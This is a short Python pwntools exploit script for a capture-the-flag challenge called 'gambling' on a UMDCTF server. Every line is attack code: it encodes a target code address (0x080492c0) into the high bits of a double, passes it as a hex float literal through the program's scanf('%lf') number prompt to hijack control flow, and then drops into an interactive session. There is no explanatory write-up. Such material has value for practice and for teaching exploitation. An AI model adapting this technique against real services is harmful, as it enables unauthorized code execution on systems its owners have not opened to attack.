from pwn import *
import struct

p = remote("challs.umdctf.io", 31005) 
#p = process("./gambling")

#gdb.attach(p, gdbscript="""
#  set follow-fork-mode child
#""")

# Construir doble con los 32 bits altos = target_addr
target_addr = 0x080492c0
bits64       = (target_addr << 32) & 0xffffffffffffffff
payload_bytes = struct.pack('<Q', bits64)
payload_double = struct.unpack('<d', payload_bytes)[0]

# Obtener literal hexadecimal que scanf("%lf") aceptaría si soportara %a
payload_str = payload_double.hex()  # '0x0.00000080492c0p-1022'

input_values = ["1.0", "1.0", "1.0",
                "1.0",
                "1.0", "1.0", payload_str]

inp = " ".join(input_values)
p.sendlineafter("Enter your lucky numbers: ", inp )

p.interactive()